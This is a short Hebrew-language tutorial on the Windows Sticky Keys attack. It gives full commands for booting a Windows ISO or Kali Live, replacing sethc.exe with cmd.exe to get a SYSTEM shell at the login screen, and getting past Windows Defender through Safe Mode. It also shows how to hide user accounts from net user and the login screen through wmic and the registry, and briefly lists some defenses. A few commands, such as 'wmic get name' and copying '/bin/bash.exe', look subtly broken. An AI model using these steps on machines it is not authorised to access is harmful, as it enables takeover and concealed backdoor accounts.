מדריך מתקפת Sticky Keys והסתרת משתמשים

איך מבצעים את מתקפת Sticky Keys?

עובדים עם דיסק מערכת חלופי (כגון Windows ISO או Kali Live):

Windows ISO:

  1. שנה את סדר האתחול לטעינה מה-ISO.
  2. בחר "תקן את המחשב שלך".
  3. גש ל-"פתרון בעיות" (Troubleshoot) ואז "אפשרויות מתקדמות" → "שורת פקודה" (Command Prompt).
  4. לרשימת הדיסקים: 
    wmic get name
  5. בחר דיסק (למשל D:), נווט ל: 
    D:\Windows\System32
  6. בצע גיבוי ושנה קובץ גישה (כגון sethc.exe או osk.exe): 
    copy sethc.exe sethc.bak
copy cmd.exe sethc.exe
  7. לאתחול מחדש: 
    shutdown /r /f /t 0
  8. לחיצה על Shift לחמש פעמים תפתח את ה-CMD בהרשאות SYSTEM.

בעיה - Windows Defender חוסם את ההחלפה:

דרכים לעקיפה:

  • להחליף במקום זאת קובץ FTP.exe ואז להיכנס ל-CMD דרך: 
    !cmd
  • להיכנס למצב Safe Mode (שמנטרל את ה-Defender): 
    bcdedit /set {default} safeboot minimal
    אתחול מחדש: 
    shutdown /r /f /t 0
    חזרה למצב רגיל: 
    bcdedit /deletevalue {default} safeboot

Kali Linux Live:

  1. שנה את סדר האתחול לטעינה מ-Kali Live.
  2. פתח טרמינל.
  3. רשום: 
    fdisk -l
  4. הרכב את הדיסק: 
    mount /dev/sda2 /mnt
  5. נווט ל: 
    cd /mnt/Windows/System32
  6. שמור עותק ושנה קובץ: 
    cp sethc.exe sethc.bak
cp /bin/bash.exe sethc.exe
  7. סנכרון וניתוק: 
    sync
umount /mnt

איך להגן מפני מתקפת Sticky Keys?

  • הגדר סיסמת BIOS (אך הסרה של סוללת CMOS תאפס אותה).
  • הצפן את הדיסק (למשל BitLocker).
  • מנע גישה פיזית למחשב.
  • Windows Defender ATP עוצר ניסיון החלפת קבצים.

איך להסתיר משתמשים ב-Windows?

להסתיר משתמש מפקודת net user:

צריך להוסיף סימן $ לשם המשתמש.

שינוי שם למשתמש קיים: 
wmic useraccount where name="שםמשתמש" call rename name="שםמשתמש$"

להסתיר משתמש ממסך הכניסה (Winlogon):

צריך לערוך את הרג'יסטרי:

  1. פתח את עורך הרג'יסטרי (regedit).
  2. גש לכתובת: 
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
  3. אם התיקיות לא קיימות - צור אותן.
  4. צור ערך חדש מסוג DWORD (32bit), בשם שם המשתמש.
  5. קבע את הערך ל-0.
